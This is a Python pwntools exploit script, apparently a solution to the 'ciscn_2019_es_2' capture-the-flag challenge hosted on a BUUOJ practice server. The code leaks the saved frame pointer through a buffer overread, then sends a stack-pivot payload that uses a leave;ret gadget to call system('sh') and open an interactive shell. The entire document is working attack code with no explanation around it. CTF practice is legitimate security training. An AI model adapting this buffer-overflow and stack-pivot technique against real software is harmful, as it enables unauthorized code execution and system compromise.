from pwn import *
import time
context.binary = './ciscn_2019_es_2'
context.log_level = 'debug'
context.timeout = None
elf = context.binary
libc = context.binary.libc

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20174)

else:
	p = process('./ciscn_2019_es_2')
	gdb.attach(p, 'b* 0x80485FD')
	raw_input()

system_plt = 0x08048559
leave_ret = 0x80485FD

#leak ebp, 
payload = 'a'*0x27 + '+'
p.send(payload)
p.recvuntil('+')
ebp = u32(p.recv(4))				
print "ebp ==> " + hex(ebp)			

stack_buffer = ebp - 0x38

payload = "sh\x00\x00"						
payload += p32(system_plt)
payload += p32(stack_buffer)
payload = payload.ljust(0x28, '\x90')

payload += p32(stack_buffer)			#fake_ebp
payload += p32(leave_ret)

p.recvline()
p.send(payload)

p.interactive()
p.close()